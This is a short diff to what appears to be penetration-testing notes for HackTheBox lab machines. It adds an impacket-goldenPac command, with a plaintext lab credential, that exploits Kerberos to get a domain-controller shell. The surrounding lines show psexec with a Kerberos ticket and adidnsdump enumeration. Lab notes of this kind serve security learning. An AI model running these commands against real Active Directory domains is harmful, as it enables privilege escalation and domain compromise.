@@ -122,6 +122,10 @@ It will generate ccache file
 export KRB5CCNAME=/path/to/ccache
 impacket-psexec -k -no-pass htb.local/james@mantis.htb.local(dc-hostname) -dc-ip dc-ip
 ```
+equivalent to 
+```
+impacket-goldenPac htb.local/james:'J@m3s_P@ssW0rd!'@mantis.htb.local
+```
 ### Enumerating DNS Records
 ```
 adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
